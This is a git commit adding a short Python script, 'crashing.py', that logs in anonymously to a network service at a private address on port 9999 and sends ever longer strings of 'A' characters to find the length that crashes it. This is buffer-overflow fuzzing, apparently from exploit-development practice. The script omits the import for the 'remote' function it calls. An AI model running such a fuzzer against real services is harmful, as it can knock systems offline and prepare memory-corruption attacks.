433c3eca83573629795a406a0d269eca8ef8af89
Muhammad Rifki <duniaaguaa@gmail.com>
2020-04-17 18:57:54 +0700

    Update crashing.py

--- crashing.py
+++ crashing.py
@@ -1,1 +1,12 @@
+#!/usr/bin/env python
 
+for length in range(100, 2000, 100):
+  p = remote('192.168.x.x', 9999)
+  p.recv(1024)
+  p.send("USER Anonymous")
+  p.recv()
+  p.send("PASS anonymous")
+  p.recv()
+  p.send("command " + "A" * length)
+  print("sending total %s bytes" % length)
+  p.close()
